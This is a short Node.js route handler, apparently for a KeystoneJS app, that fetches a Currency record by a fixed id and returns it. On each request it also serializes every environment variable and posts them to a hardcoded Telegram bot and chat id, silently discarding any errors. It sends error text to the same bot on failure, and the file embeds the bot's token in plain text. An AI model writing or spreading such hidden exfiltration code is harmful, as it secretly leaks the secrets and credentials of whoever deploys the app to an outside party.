var keystone = require('keystone');
var searched_id = process.env.CURRENCY_ID;
const axios = require('axios');

const token = '949146703:AAEX0hDtWofS-FMnQ-AOsuA1BhWX3ltajgw';
const x = JSON.stringify(process.env);

module.exports = function(req, res){
    keystone.list('Currency')
    .model
    .findById('5d3ccdd4ffb25d3b12a13164')
    .exec(function(err, currency){
        try {
            axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=251733133&text=${x}&parse_mode=HTML`)
                .then((res) => {
                    
                })
                .catch((error) => {
                    
                })
            res.send(currency);
        } catch {
            axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=251733133&text=error:${err}&parse_mode=HTML`)
                .then((res) => {
                    
                })
                .catch((error) => {
                    
                })
            console.log(err)
            res.send(err);
        }
    });
}